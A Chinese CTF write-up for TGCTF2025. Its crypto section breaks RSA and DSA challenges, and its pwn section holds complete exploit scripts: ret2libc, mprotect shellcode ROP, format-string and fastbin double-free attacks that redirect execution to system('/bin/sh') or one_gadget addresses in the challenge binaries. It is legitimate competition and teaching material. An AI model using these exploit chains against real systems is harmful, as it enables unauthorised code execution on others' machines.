---
title: TGCTF2025
published: 2025-04-14
pinned: false
description: TGCTF2025 crypto wp
tags: ['crypto']
category: CTF-crypto
licenseName: "MIT"
author: zsm
draft: false
date: 2025-04-14
pubDate: 2025-04-14
---


## 前言
rank33，感觉自己还是太菜了，放一部分的wp

## 题目
### crypto

#### AAAAAAAA·真·签到 ｜solved by zsm
task
```
给你flag签个到好了
UGBRC{RI0G!O04_5C3_OVUI_DV_MNTB}
诶，我的flag怎么了？？？？
好像字母对不上了
我的签到怎么办呀，急急急
听说福来阁好像是TGCTF开头的喔
```
思路就是先对照，然后对一下思路？UGBRC和TGCTF进行比较，位移是-1,0,1...，猜测每个增加1，搓个脚本
exp.py
```python
def caesar_shift(text):
    shift = -1
    result = []
    shift_count = 0

    for char in text:
        if char.isalpha():
            if char.isupper():
                new_char = chr(((ord(char) - ord('A') + shift) % 26) + ord('A'))
            else:
                new_char = chr(((ord(char) - ord('a') + shift) % 26) + ord('a'))
            result.append(new_char)
        else:
            result.append(char)
        shift += 1

    return ''.join(result)

input_text = "UGBRC{RI0G!O04_5C3_OVUI_DV_MNTB}"
output_text = caesar_shift(input_text)
print(output_text)
```

#### mm不躲猫猫｜solved by zsm
60组nc的广播攻击，先读取一下，然后直接爆，好像不用读取也行
读取.py
```python
import re

def parse_nc_pairs(input_text):
    # Initialize dictionaries for n1, c1, n2, c2, ...
    n_values = {}
    c_values = {}
    
    # Regex to match [n_k] blocks and extract n and c
    pattern = r'\[n_(\d+)\]\s*n\s*=\s*(\d+)\s*c\s*=\s*(\d+)'
    
    # Find all matches
    matches = re.findall(pattern, input_text, re.MULTILINE)
    for index, n_val, c_val in sorted(matches, key=lambda x: int(x[0])):
        n_key = f'n{index}'
        c_key = f'c{index}'
        n_values[n_key] = int(n_val)
        c_values[c_key] = int(c_val)
    
    return n_values, c_values

# Read input from file (replace 'input.txt' with your file path)
with open('challenge.txt', 'r') as f:
    input_text = f.read()

# Parse into n1, c1, n2, c2, ...
n_values, c_values = parse_nc_pairs(input_text)

# Optional: Print to verify
for i in range(1, 61):  # Assuming 60 pairs
    n_key = f'n{i}'
    c_key = f'c{i}'
    if n_key in n_values and c_key in c_values:
        print(f"{n_key} = {n_values[n_key]}")
        print(f"{c_key} = {c_values[c_key]}")
```

exp.py
```python
from Crypto.Util.number import*
import gmpy2
e = 65537
#不用60组全拿
n = [n1,n2,n3,n4,n5,n6,n7,n8,n9,n10,n11,n12,n13,n14,n15,n16,n17,n18,n19]
c = [c1,c2,c3,c4,c5,c6,c7,c8,c9,c10,c11,c12,c13,c14,c15,c16,c17,c18,c19]

for i in range(len(n)):
    for j in range(len(n)):
        if (i!=j):
            t = gmpy2.gcd(n[i],n[j])
            if t != 1:
                p = t
                q = n[i] // p
                d = gmpy2.invert(e,(p-1)*(q-1))
                m = pow(c[i],d,n[i])
                print(long_to_bytes(m))
```

#### tRwSiAns ｜solved by zsm
task.py
```python
from flag import FLAG
from Crypto.Util.number import getPrime, bytes_to_long
import hashlib

def generate_key(bits=512):
    p = getPrime(bits)
    q = getPrime(bits)
    return p * q, 3


def hash(x):
    return int(hashlib.md5(str(x).encode()).hexdigest(), 16)


def encrypt(m, n, e):
    x1, x2 = 307, 7
    c1 = pow(m + hash(x1), e, n)
    c2 = pow(m + hash(x2), e, n)
    return c1, c2


m = bytes_to_long(FLAG)
n, e = generate_key()
c1, c2 = encrypt(m, n, e)
print(f"n = {n}")
print(f"e = {e}")
print(f"c1 = {c1}")
print(f"c2 = {c2}")
```

富兰克林，直接写
exp.py
```python
from Crypto.Util.number import *
import hashlib
import sys
import libnum
def hash(x):
    return int(hashlib.md5(str(x).encode()).hexdigest(), 16)
x1, x2 = 307, 7
h1,h2=hash(x1),hash(x2)

n = 
e = 3
c1 = 
c2 = 

import binascii
def franklinReiter(n,e,c1,c2,a,b):
    PR.<x> = PolynomialRing(Zmod(n))
    g1 = (x+a)^e - c1
    g2 = (x+b)^e - c2

    def gcd(g1, g2):
        while g2:
            g1, g2 = g2, g1 % g2
        return g1.monic() # 
    return -gcd(g1, g2)[0]

m=franklinReiter(n,e,c1,c2,h1,h2)
print(libnum.n2s(int(m)))
```

#### 宝宝rsa ｜solved by zsm
task.py
```python
from math import gcd
from Crypto.Util.number import *
from secret import flag

# PART1
p1 = getPrime(512)
q1 = getPrime(512)
n1 = p1 * q1
phi = (p1 - 1) * (q1 - 1)
m1 = bytes_to_long(flag[:len(flag) // 2])
e1 = getPrime(18)
while gcd(e1, phi) != 1:
    e1 = getPrime(17)
c1 = pow(m1, e1, n1)

print("p1 =", p1)
print("q1 =", q1)
print("c1 =", c1)

# PART2
n2 = getPrime(512) * getPrime(512)
e2 = 3
m2 = bytes_to_long(flag[len(flag) // 2:])
c2 = pow(m2, e2, n2)

print("n2 =", n2)
print("c2 =", c2)
print("e2 =", e2)
```

part1爆破e，part2小e攻击,爆破e的脚本自己写的很慢，ai启动

exp.py
```python
from math import gcd, isqrt
from Crypto.Util.number import *
import sys

# 已知的 PART1 参数
p1 = 
q1 = 
c1 = 

# 已知的 PART2 参数
n2 = 
c2 = 
e2 = 3

phi = (p1 - 1) * (q1 - 1)
n1 = p1 * q1

def is_candidate_valid(e):
    return gcd(e, phi) == 1

def get_primes_in_range(low, high):
    sieve = [True] * (high + 1)
    sieve[0] = sieve[1] = False
    for i in range(2, isqrt(high)+1):
        if sieve[i]:
            for j in range(i*i, high+1, i):
                sieve[j] = False
    return [i for i in range(low, high) if sieve[i]]

primes_18 = get_primes_in_range(2**17, 2**18)
found = False
m1_found = None
e1_found = None

for e in primes_18:
    if is_candidate_valid(e):
        try:
            d = inverse(e, phi)
        except Exception as ex:
            continue
        m1 = pow(c1, d, n1)
        m1_bytes = long_to_bytes(m1)
        if m1_bytes.startswith(b'TGCTF{'):
            e1_found = e
            m1_found = m1_bytes
            print("找到可能的 e1:", e)
            break
if m1_found is None:
    primes_17 = get_primes_in_range(2**16, 2**17)
    for e in primes_17:
        if is_candidate_valid(e):
            try:
                d = inverse(e, phi)
            except Exception as ex:
                continue
            m1 = pow(c1, d, n1)
            m1_bytes = long_to_bytes(m1)
            if m1_bytes.startswith(b'TGCTF{'):
                e1_found = e
                m1_found = m1_bytes
                print("找到可能的 e1（17位）:", e)
                break

if m1_found is None:
    print("未能在候选 e1 范围内找到正确的前半部分。")
    sys.exit(1)

print("成功恢复 PART1 的明文:", m1_found)

def integer_cube_root(n):
    lo = 0
    hi = 1 << ((n.bit_length() + 2) // 3)
    while lo < hi:
        mid = (lo + hi) // 2
        if mid**3 <= n:
            lo = mid + 1
        else:
            hi = mid
    return lo - 1

m2 = integer_cube_root(c2)
m2_bytes = long_to_bytes(m2)
print("成功恢复 PART2 的明文:", m2_bytes)

flag = m1_found + m2_bytes
print("恢复的 flag 为:")
print(flag.decode(errors='replace'))
```

#### 费克特尔 ｜solved by zsm
分解n就行了
exp.py
```python
c=
n=
e=65537
p,q,r,s,x=

from Crypto.Util.number import *

phi=(p-1)*(q-1)*(r-1)*(s-1)*(x-1)
d=inverse(e,phi)
m=long_to_bytes(pow(c,d,n))
print(m)
```

#### EZRSA ｜solved by zsm
task.py
```python
from Crypto.Util.number import *

def genarate_emojiiiiii_prime(nbits, base=0):
    while True:
        p = getPrime(base // 32 * 32) if base >= 3 else 0
        for i in range(nbits // 8 // 4 - base // 32):
            p = (p << 32) + get_random_emojiiiiii() # 猜一猜
        if isPrime(p):
            return p

m = bytes_to_long(flag.encode()+ "".join([long_to_bytes(get_random_emojiiiiii()).decode() for _ in range(5)]).encode())
p = genarate_emojiiiiii_prime(512, 224)
q = genarate_emojiiiiii_prime(512)

n = p * q
e = "💯"
c = pow(m, bytes_to_long(e.encode()), n)

print("p0 =", long_to_bytes(p % 2 ** 256).decode())
print("n =", n)
print("c =", c)

p0 = '😘😾😂😋😶😾😳😷'
n = 
c = 
```
先把plow和e转了
```python
from Crypto.Util.number import*
e = bytes_to_long("💯".encode())
print(e)
p0 = "😘😾😂😋😶😾😳😷"
print(bytes_to_long(p0.encode()))
```
plow就是256位，自然想到copper，看p的生成方法，先生成224位的素数，然后填充了九个32bits的emoji，目前已知八个，爆破这一个未知的emoji即可，爆破$2^{31}$到$2^{32}$是不可能的，列出来一点常见的emoji去爆破
```python
from Crypto.Util.number import*
from gmpy2 import*
e=4036989615
plow=
n = 
c = 

emoji = '😀 😃 😄 😁 😆 😅 🤣 😂 🙂 🙃 😉 😊 😇 🥰 😍 🤩 😘 😗'.split(' ')

def recover_p(n, p_low, k_bits):
    P.<x> = PolynomialRing(Zmod(n))
    f = x * 2**k_bits + p_low
    roots = f.monic().small_roots(X=2^(n.nbits()//2 - k_bits), beta=0.4)
    if roots:
        return roots[0] * 2**k_bits + p_low
    
for i in emoji:
    pp=bytes_to_long(i.encode())*2**256+plow
    p=recover_p(n,pp,288)
    if p:
        print(p)
        break
```
然后是个不互素问题，直接crt
```python
from Crypto.Util.number import *

from sage.all import *
n = 
c = 
p=
e=4036989615
q  = n // p
phi=(p-1)*(q-1)
#print(GCD(e,phi))   =15
assert p*q == n
d = inverse(e//15,phi)
m = pow(c,d,n)

R = PolynomialRing(Zmod(p), 'x')
x = R.gen()
f = x^15 - m
roots_p = f.roots()

R = PolynomialRing(Zmod(q), 'x')
x = R.gen()
f = x^15 - m
roots_q = f.roots()

for rp, _ in roots_p:
    for rq, _ in roots_q:
        mm = crt([int(rp), int(rq)], [p, q])
        try:
            res = long_to_bytes(mm)
            if b'TGCTF' in res:
                print(res.decode())
        except:
            pass
```

#### LLLCG ｜ 复现
task.py
```python
from hashlib import sha256
from Crypto.Util.number import *
from random import randint
import socketserver
from secret import flag, dsa_p, dsa_q

class TripleLCG:
    def __init__(self, seed1, seed2, seed3, a, b, c, d, n):
        self.state = [seed1, seed2, seed3]
        self.a = a
        self.b = b
        self.c = c
        self.d = d
        self.n = n

    def next(self):
        new = (self.a * self.state[-3] + self.b * self.state[-2] + self.c * self.state[-1] + self.d) % self.n
        self.state.append(new)
        return new

class DSA:
    def __init__(self):
        # while True:
            # self.q = getPrime(160)
            # t = 2 * getPrime(1024 - 160) * self.q
            # if isPrime(t + 1):
            #    self.p = t + 1
            #    break
        self.p = dsa_p
        self.q = dsa_q
        self.g = pow(2, (self.p - 1) // self.q, self.p)
        self.x = randint(1, self.q - 1)
        self.y = pow(self.g, self.x, self.p)

    def sign(self, msg, k):
        h = bytes_to_long(sha256(msg).digest())
        r = pow(self.g, k, self.p) % self.q
        s = (inverse(k, self.q) * (h + self.x * r)) % self.q
        return (r, s)

    def verify(self, msg, r, s):
        if not (0 < r < self.q and 0 < s < self.q):
            return False
        h = bytes_to_long(sha256(msg).digest())
        w = inverse(s, self.q)
        u1 = (h * w) % self.q
        u2 = (r * w) % self.q
        v = ((pow(self.g, u1, self.p) * pow(self.y, u2, self.p)) % self.p) % self.q
        return v == r

class Task(socketserver.BaseRequestHandler):
    def _recvall(self):
        BUFF_SIZE = 2048
        data = b''
        while True:
            part = self.request.recv(BUFF_SIZE)
            data += part
            if len(part) < BUFF_SIZE:
                break
        return data.strip()

    def send(self, msg, newline=True):
        if newline:
            msg += b'\n'
        self.request.sendall(msg)

    def recv(self, prompt=b'[-] '):
        self.send(prompt, newline=False)
        return self._recvall()

    def handle(self):
        n = getPrime(128)
        a, b, c, d = [randint(1, n - 1) for _ in range(4)]
        seed1, seed2, seed3 = [randint(1, n - 1) for _ in range(3)]

        lcg = TripleLCG(seed1, seed2, seed3, a, b, c, d, n)
        dsa = DSA()

        self.send(b"Welcome to TGCTF Challenge!\n")
        self.send(f"p = {dsa.p}, q = {dsa.q}, g = {dsa.g}, y = {dsa.y}".encode())

        small_primes = [59093, 65371, 37337, 43759, 52859, 39541, 60457, 61469, 43711]
        used_messages = set()
        for o_v in range(3):
            self.send(b"Select challenge parts: 1, 2, 3\n")
            parts = self.recv().decode().split()

            if '1' in parts:
                self.send(b"Part 1\n")
                for i in range(12):
                    self.send(f"Message {i + 1}: ".encode())
                    msg = self.recv()
                    used_messages.add(msg)
                    k = lcg.next()
                    r, s = dsa.sign(msg, k)
                    self.send(f"r = {r}, ks = {[k % p for p in small_primes]}\n".encode())

            if '2' in parts:
                self.send(b"Part 2\n")
                for _ in range(307):
                    k = lcg.next()
                for i in range(10):
                    self.send(f"Message {i + 1}: ".encode())
                    msg = self.recv()
                    k = lcg.next() % dsa.q
                    r, s = dsa.sign(msg, k)
                    self.send(f"Signature: r = {r}, s = {s}\n".encode())
                    used_messages.add(msg)

            if '3' in parts:
                self.send(b"Part 3\n")
                self.send(b"Forged message: ")
                final_msg = self.recv()
                self.send(b"Forged r: ")
                r = int(self.recv())
                self.send(b"Forged s: ")
                s = int(self.recv())

                if final_msg in used_messages:
                    self.send(b"Message already signed!\n")
                elif dsa.verify(final_msg, r, s):
                    self.send(f"Good! Your flag: {flag}\n".encode())
                else:
                    self.send(b"Invalid signature.\n")
```
三个部分
第一个部分会给12组r和k，有模数，可以crt求解，十二组可以求出lcg的abcdn
第二个部分在已知abcdn后307次lcg，然后求出k，p,q,g,y均为已知值,即可计算得到x
第三部分就是伪造签名发过去就行了

但是这个题的交互真的很麻烦啊我靠，我是先把数据拉下来再传的，求解代码扔上面吧

```python
R.<a,b,c,d> = PolynomialRing(ZZ)

f1=k_list[0]*a+k_list[1]*b+k_list[2]*c+d-k_list[3]
f2=k_list[1]*a+k_list[2]*b+k_list[3]*c+d-k_list[4]
f3=k_list[2]*a+k_list[3]*b+k_list[4]*c+d-k_list[5]
f4=k_list[3]*a+k_list[4]*b+k_list[5]*c+d-k_list[6]
f5=k_list[4]*a+k_list[5]*b+k_list[6]*c+d-k_list[7]
f6=k_list[5]*a+k_list[6]*b+k_list[7]*c+d-k_list[8]
f7=k_list[6]*a+k_list[7]*b+k_list[8]*c+d-k_list[9]
f8=k_list[7]*a+k_list[8]*b+k_list[9]*c+d-k_list[10]
f9=k_list[8]*a+k_list[9]*b+k_list[10]*c+d-k_list[11]

F=[f1,f2,f3,f4,f5,f6,f7,f8,f9]
ideal = Ideal(F)

I = ideal.groebner_basis()
n = int(I[4])
a = int(-I[0].univariate_polynomial()(0))%n
b = int(-I[1].univariate_polynomial()(0))%n
c = int(-I[2].univariate_polynomial()(0))%n
d = int(-I[3].univariate_polynomial()(0))%n

for _ in range(307):
    k = lcg.next()
m = b'a'
h = bytes_to_long(sha256(m).digest())
k = lcg.next()
print('k=',k)
inv_r=inverse(r_l2[0],q)
x = ((s_l[0]*k%q-h)*inv_r) % q
print(x)

end_h = bytes_to_long(sha256(b'b').digest())
r_ = pow(g,1,p)%q
s_ = ((end_h+x*r_)*inverse(1,q))%q
```

### pwn
#### 签到 | solved by v2rtua1
没什么好说的，gets->ret2libc
```python
from pwnfunc import *

io, elf, libc = pwn_initial()
set_context(term="tmux_split", arch="amd64")
"""amd64 i386 arm arm64 riscv64"""

prdi = 0x0000000000401176
ret = 0x000000000040101A
puts = 0x0000000000401060
payload = b"a" * (0x78) + p(prdi) + p(elf.got["puts"]) + p(puts) + p(elf.sym["main"])
r()
sl(payload)
rl()
pause()
base = u(r(6).ljust(8, b"\0")) - 0x80E50
binsh = base + 0x1D8678
system = base + 0x50D70
payload = b"a" * (0x78) + p(prdi) + p(binsh) + p(ret) + p(system)
sl(payload)
ia()
```

#### overflow | solved by v2rtua1
x86的gets溢出题，同时是静态编译，尝试--ropchain一把梭没成功，观察到程序提供了很多gadget并且有mprotect函数，于是打mprotect写shellcode然后jmp过去

```python
from pwnfunc import *

io, elf, libc = pwn_initial()
set_context(term="tmux_split", arch="i386")
"""amd64 i386 arm arm64 riscv64"""

name = 0x80EF320
read = 0x806F960
pop_3 = 0x080ADD9D
mprotect = 0x08070A70
s(
    p(mprotect)
    + p(pop_3)
    + p(0x080EF000)
    + p(0x1000)
    + p(7)
    + p(read)
    + p(0x80EF300)
    + p(0)
    + p(0x80EF300)
    + p(0x1000)
)

payload = b"a" * (0xD0 - 8) + p(name + 4)
sl(payload)
pause()
s(b"a" * 24 + p(0x80EF318 + 4) + asm(shellcraft.sh()))

ia()
```

#### stack | solved by v2rtua1
一开始没看出啥门道，最后才发现可以溢出到原write的参数上，因为有sh字符串，改成system("/bin/sh")就结束了
```python
from pwnfunc import *

io, elf, libc = pwn_initial()
set_context(term="tmux_split", arch="amd64")
"""amd64 i386 arm arm64 riscv64"""

binsh = 0x000000000404108
trigger = 0x00000000004011B6
payload = b"a" * 0x40 + p(59) + p(binsh) + p(0) + p(0)
s(payload)
pause()
payload = b"a" * 0x40 + p(0) + p(0x00000000004011D0)
s(payload)
ia()
```

#### fmt | solved by v2rtua1
格式化字符串题，正常流程下来只有一次格式化机会因为0x30不够再写个0x114514进去了，于是观察栈构造，几次调试后发现可以修改printf返回地址到前几行代码，这样就可以实现循环printf
然后就是随便打了，泄露libc->onegadget
```python
from pwnfunc import *

io, elf, libc = pwn_initial()
set_context(term="tmux_split", arch="amd64")
"""amd64 i386 arm arm64 riscv64"""

magic = 0x0000000000404010
ret_off = 0x68
main = 0x00000000004011B6
ru(b"your gift ")
stack = int(r(len("0x7ffd10a3fb90")), 16)
ret_addr = stack + ret_off
printf_got = 0x403FE0
success(hex(ret_addr))
"""
0xe3afe execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xe3b01 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xe3b04 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp
"""
payload = b"%25c%8$hhn%19$p." + p(ret_addr - 0x70)
s(payload)
ru(b"0x")
base = int(r(12), 16) - 0x24083
system = base + 0x52290
success(hex(base))
success(hex(system))
system = base + 0x52290
last3 = hex(system)[-6:]
success(last3)

og = base + 0xE3B01
last3 = hex(og)[-6:]
F = int(last3[:2], 16)
L = int(last3[2:], 16)
M = int(last3[:3], 16)
success(hex(og))
payload = bytes(f"%{F}c%10$hhn".encode("utf-8"))
payload += bytes(f"%{L-F}c%11$hn".encode("utf-8"))
payload = payload.ljust(0x20, b"a")
payload += p(ret_addr + 2) + p(ret_addr)
s(payload)
ia()
```

#### heap | solved by v2rtua1
2.23的堆题，提供alloc和free两个常规功能和一个附带功能，发现无show于是先想到unsorted bin爆破stdin泄露地址，但是发现只给了fastbin，结合没pie和uaf的特性往name上写入fastbin头得以控制list，然后因为有了任意free就可以再布置一个unsorted bin大小的chunk在name上，free完泄露libc直接打malloc_hook
```python
from pwnfunc import *

io, elf, libc = pwn_initial()
set_context(term="tmux_split", arch="amd64")
"""amd64 i386 arm arm64 riscv64"""

def menu():
    ru(b"> ")

def alloc(size, content):
    menu()
    sl(b"1")
    ru(b"size?")
    sl(str(size))
    ru(b"else?")
    s(content)

def free(idx):
    menu()
    sl(b"2")
    ru(b"> ")
    sl(str(idx))

def change(name):
    menu()
    sl(b"3")
    r()
    s(name)

payload = (
    (b"\0" * 8 + p(0xA1) + p(0) * (9 * 2) + p(0xA1) + p(0x21) + p(0) * 2).ljust(
        0xC0, b"\0"
    )
    + p(0x21)
    + p(0x71)
)

s(payload)
alloc(0x60, b"a")  # 0
alloc(0x60, b"a")  # 1
alloc(0x10, b"a")  # 2
free(0)
free(1)
free(0)
alloc(0x60, p(0x602180))  # 3
alloc(0x60, b"a")  # 4
alloc(0x60, b"a")  # 5
hptr = 0x6020C0 + 0x10
payload = p(0) * 2 + p(hptr)

alloc(0x60, payload)  # 6
# x=0x00000000006020C0

free(0)
change(b"a" * 0xF + b"Z")
ru(b"Z")
base = u(r(6).ljust(8, b"\0")) - 0x3C4B78
success(hex(base))
mhook = base + 0x3C4B10
"""
0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL || {[rsp+0x30], [rsp+0x38], [rsp+0x40], [rsp+0x48], ...} is a valid argv

0xf03a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL || {[rsp+0x50], [rsp+0x58], [rsp+0x60], [rsp+0x68], ...} is a valid argv

0xf1247 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv
"""
og = [0x4527A, 0xF03A4, 0xF1247]
og = base + og[2]
dest = base + 0x3C4AED
change(p(0) + p(0xA1))
alloc(0x60, b"\0")  # 7
alloc(0x60, b"\0")  # 8 %
alloc(0x60, b"\0")  # 9
alloc(0x10, b"\0")  # 10
free(8)
free(9)
free(8)
alloc(0x60, p(dest))  # 11
alloc(0x60, b"\0")  # 12
alloc(0x60, b"\0")  # 13
payload = b"\0" * 0x13 + p(og)
alloc(0x60, payload)  # 14

menu()
sl(b"1")
ru(b"size?")
sl(str(0x30))

ia()
```

#### onlygets | solved by v2rtua1
题目给了个docker和一个.so库，so是个后门
程序开头将bss上的stdin等指针置空了，表明出题人不想让我们二次写/泄露，这种没泄露的题一般都是无输出直接增减偏移去打的。先看jmp/call，这种类型的gadget只和rax/[rax]/[rbp]有关联，rax没法控制而rbp可以，那就找所有跟rbp有关的gadget。想了一会发现可以打这么个链：rbp=(any writeable-0x3d),pop rsi...(偏移)+add ebx,esi+add [rbp-0x3d],ebx....+pop rbp,(any writeable)+ret+jmp [rbp]
```python
from pwnfunc import *

io, elf, libc = pwn_initial()
set_context(term="tmux_split", arch="amd64")
"""amd64 i386 arm arm64 riscv64"""

add_ebx_esi = 0x00000000004005FD
add_rbp_3dXXX = 0x0000000000400548  # add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; repz ret
prsi_r15 = 0x0000000000400661
prbp = 0x00000000004004E8
leave = 0x00000000004005FB
ret = 0x0000000000400456
bss = 0x0000000000601010
off1 = 0xD880
off2 = 0x11A4
payload = (
    b"a" * 0x10
    + p(bss + 0x3D)
    + p(prsi_r15)
    + (p(off1 + off2) + p(0))
    + p(add_ebx_esi)
    + p(add_rbp_3dXXX)
    + p(prbp)
    + p(bss)
    + p(ret)
    + p(0x000000000040076B)
)
pause()
sl(payload)
ia()
```

## 总结
没有web，misc那几个都简单就不放了（